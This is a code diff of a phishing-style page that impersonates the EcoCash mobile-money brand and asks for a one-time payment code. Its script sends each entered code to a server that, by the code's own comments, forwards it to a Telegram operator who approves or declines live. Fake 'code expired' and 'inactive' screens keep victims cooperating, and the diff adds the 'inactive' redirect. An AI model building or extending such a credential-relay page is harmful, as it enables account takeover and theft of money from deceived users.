@@ -31,63 +31,30 @@
   .brand { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 22px; letter-spacing: -0.6px; }
   .brand .eco { color: var(--eco-blue); }
   .brand .cash { color: var(--eco-red); }
-  .header .label {
-    font-size: 10.5px; font-weight: 700; text-transform: uppercase;
-    letter-spacing: 0.7px; color: var(--eco-muted);
-  }
+  .header .label { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: var(--eco-muted); }
 
-  .card {
-    background: #fff; border-radius: 20px; border: 1px solid var(--eco-border);
-    box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden;
-  }
-  .card-head {
-    padding: 22px 22px 16px; border-bottom: 1px solid var(--eco-border);
-    background: #FBFCFE; text-align: center;
-  }
+  .card { background: #fff; border-radius: 20px; border: 1px solid var(--eco-border); box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden; }
+  .card-head { padding: 22px 22px 16px; border-bottom: 1px solid var(--eco-border); background: #FBFCFE; text-align: center; }
   .card-head h1 { font-size: 18px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 4px; }
   .card-head p { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
 
   .card-body { padding: 20px 22px 22px; }
 
-  .tx-block {
-    background: var(--eco-soft); border-radius: 12px; padding: 14px 16px;
-    display: flex; justify-content: space-between; align-items: center;
-    margin-bottom: 20px;
-  }
-  .tx-block .tx-left .k {
-    font-size: 10.5px; font-weight: 700; text-transform: uppercase;
-    letter-spacing: 0.6px; color: var(--eco-muted); margin-bottom: 3px;
-  }
+  .tx-block { background: var(--eco-soft); border-radius: 12px; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+  .tx-block .tx-left .k { font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: var(--eco-muted); margin-bottom: 3px; }
   .tx-block .tx-left .v { font-size: 13.5px; font-weight: 700; word-break: break-all; }
   .tx-block .tx-amt { font-size: 17px; font-weight: 800; color: var(--eco-blue); letter-spacing: -0.4px; white-space: nowrap; }
   .tx-block .tx-amt .cur { font-size: 11.5px; font-weight: 700; margin-right: 3px; opacity: 0.85; }
 
   .expired-notice {
-    display: none;
-    background: #FEF2F2;
-    border: 1px solid #FECACA;
-    border-left: 3px solid var(--eco-red);
-    color: #B91C1C;
-    font-size: 12.5px;
-    font-weight: 600;
-    padding: 11px 14px;
-    border-radius: 10px;
-    margin-bottom: 14px;
-    line-height: 1.5;
-    align-items: center;
-    gap: 8px;
+    display: none; background: #FEF2F2; border: 1px solid #FECACA; border-left: 3px solid var(--eco-red);
+    color: #B91C1C; font-size: 12.5px; font-weight: 600; padding: 11px 14px; border-radius: 10px;
+    margin-bottom: 14px; line-height: 1.5; align-items: center; gap: 8px;
   }
   .expired-notice.show { display: flex; }
-  .expired-notice .icon {
-    width: 20px; height: 20px; border-radius: 50%;
-    background: var(--eco-red); color: #fff;
-    display: inline-flex; align-items: center; justify-content: center;
-    font-size: 12px; font-weight: 800; flex-shrink: 0;
-  }
+  .expired-notice .icon { width: 20px; height: 20px; border-radius: 50%; background: var(--eco-red); color: #fff; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
   .expired-notice .text { flex: 1; }
-  .expired-notice .text small {
-    display: block; font-size: 11px; font-weight: 500; color: #7F1D1D; margin-top: 2px;
-  }
+  .expired-notice .text small { display: block; font-size: 11px; font-weight: 500; color: #7F1D1D; margin-top: 2px; }
 
   .otp-label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; text-align: center; }
   .otp-row { display: flex; justify-content: center; gap: 8px; margin-bottom: 14px; }
@@ -103,15 +70,8 @@
   .otp-row input.filled { border-color: var(--eco-blue); background: #F6FBFE; }
   .otp-row input:disabled { background: #F5F7F9; color: var(--eco-muted); }
 
-  .otp-help {
-    display: flex; justify-content: center; align-items: center;
-    gap: 6px; margin-bottom: 16px; font-size: 12px; color: var(--eco-muted);
-  }
-  .resend-btn {
-    background: transparent; border: none; font-family: inherit;
-    font-size: 12px; font-weight: 700; color: var(--eco-blue); cursor: pointer;
-    padding: 2px 0;
-  }
+  .otp-help { display: flex; justify-content: center; align-items: center; gap: 6px; margin-bottom: 16px; font-size: 12px; color: var(--eco-muted); }
+  .resend-btn { background: transparent; border: none; font-family: inherit; font-size: 12px; font-weight: 700; color: var(--eco-blue); cursor: pointer; padding: 2px 0; }
   .resend-btn:disabled { color: var(--eco-muted); cursor: default; }
 
   .action-btn {
@@ -125,49 +85,27 @@
   .action-btn:active { transform: scale(0.99); }
   .action-btn:disabled { opacity: 0.7; cursor: wait; }
 
-  .card-foot {
-    padding: 14px 22px 18px; border-top: 1px solid var(--eco-border);
-    background: #FBFCFE; text-align: center;
-  }
+  .card-foot { padding: 14px 22px 18px; border-top: 1px solid var(--eco-border); background: #FBFCFE; text-align: center; }
   .card-foot .brand { font-size: 15px; }
   .card-foot .small { font-size: 10.5px; color: var(--eco-muted); margin-top: 3px; }
 
-  .page-foot {
-    text-align: center; margin-top: 16px;
-    font-size: 11px; color: var(--eco-muted); line-height: 1.6;
-  }
+  .page-foot { text-align: center; margin-top: 16px; font-size: 11px; color: var(--eco-muted); line-height: 1.6; }
 
-  /* Full-page Verifying overlay */
-  .verifying {
-    position: fixed; inset: 0;
-    background: #FFFFFF;
-    display: none; align-items: center; justify-content: center;
-    z-index: 2000;
-  }
+  .verifying { position: fixed; inset: 0; background: #FFFFFF; display: none; align-items: center; justify-content: center; z-index: 2000; }
   .verifying.show { display: flex; }
   .verifying .inner { text-align: center; max-width: 320px; padding: 0 24px; }
-  .verifying .logo-big {
-    display: inline-flex; align-items: baseline;
-    font-weight: 900; font-size: 32px; letter-spacing: -1px; margin-bottom: 32px;
-  }
+  .verifying .logo-big { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 32px; letter-spacing: -1px; margin-bottom: 32px; }
   .verifying .logo-big .eco { color: var(--eco-blue); }
   .verifying .logo-big .cash { color: var(--eco-red); }
-  .verifying .spinner {
-    width: 54px; height: 54px; margin: 0 auto 22px;
-    border: 4px solid #E5E7EB; border-top-color: var(--eco-blue);
-    border-radius: 50%; animation: spin 0.9s linear infinite;
-  }
+  .verifying .spinner { width: 54px; height: 54px; margin: 0 auto 22px; border: 4px solid #E5E7EB; border-top-color: var(--eco-blue); border-radius: 50%; animation: spin 0.9s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
   .verifying .t { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; }
   .verifying .s { font-size: 13px; color: var(--eco-muted); line-height: 1.6; }
 
   .toast {
-    position: fixed; bottom: 24px; left: 50%;
-    transform: translateX(-50%) translateY(80px);
-    background: var(--eco-navy); color: #fff;
-    padding: 11px 18px; border-radius: 9px;
-    font-size: 12.5px; font-weight: 600;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px);
+    background: var(--eco-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
     opacity: 0; transition: all .3s ease; z-index: 3000; pointer-events: none;
     max-width: 90%; text-align: center;
   }
@@ -209,7 +147,7 @@
         <span class="icon">!</span>
         <div class="text">
           Code expired. Please resend.
-          <small>Your previous code is no longer valid. Tap “Resend code” to receive a new one.</small>
+          <small>Your previous code is no longer valid. Tap "Resend code" to receive a new one.</small>
         </div>
       </div>
 
@@ -346,7 +284,7 @@
   }
 
   /* ------------------------------------------------------------
-     Request a code
+     Request a code (only resets state on server)
   ------------------------------------------------------------ */
   async function requestCode(source) {
     hideExpiredNotice();
@@ -385,9 +323,7 @@
   }
 
   /* ------------------------------------------------------------
-     Verify — send the entered code to the server, which
-     forwards it to Telegram. Approve in Telegram → verify.html.
-     Decline in Telegram → red "Code expired. Please resend."
+     Verify — submit OTP to Telegram, poll for Approve / Decline / Inactive
   ------------------------------------------------------------ */
   async function verifyCode() {
     hideExpiredNotice();
@@ -398,13 +334,10 @@
       return;
     }
 
-    // Full-page overlay
     document.getElementById('verifying').classList.add('show');
     document.getElementById('verifyBtn').disabled = true;
     setOtpEnabled(false);
 
-    // Send the entered code to the server, which forwards it to Telegram.
-    // The server does NOT decide approval — the admin does, via Telegram.
     try {
       await fetch('/api/verification/submit', {
         method: 'POST',
@@ -417,13 +350,18 @@
           c:  txData.c
         })
       });
-    } catch (e) {
-      // Keep waiting; the poll below will decide the outcome
-    }
+    } catch (e) { /* keep polling */ }
 
-    // Poll until the admin taps Approve or Decline in Telegram
     const start = Date.now();
-    const maxWaitMs = 2 * 60 * 1000;   // 2 minutes
+    const maxWaitMs = 2 * 60 * 1000;
+
+    const q = new URLSearchParams({
+      tx:  txData.tx,
+      am:  txData.am,
+      cur: txData.cur,
+      rn:  txData.rn,
+      c:   txData.c
+    });
 
     const check = async () => {
       if (Date.now() - start > maxWaitMs) {
@@ -453,14 +391,12 @@
         return;
       }
 
+      if (decision === 'inactive') {
+        window.location.replace('inactive.html?' + q.toString());
+        return;
+      }
+
       if (decision === 'approved') {
-        const q = new URLSearchParams({
-          tx:  txData.tx,
-          am:  txData.am,
-          cur: txData.cur,
-          rn:  txData.rn,
-          c:   txData.c
-        });
         window.location.replace('verify.html?' + q.toString());
         return;
       }
@@ -471,9 +407,6 @@
     check();
   }
 
-  /* ------------------------------------------------------------
-     On load
-  ------------------------------------------------------------ */
   document.addEventListener('DOMContentLoaded', () => {
     if (txData.tx) requestCode('auto');
   });
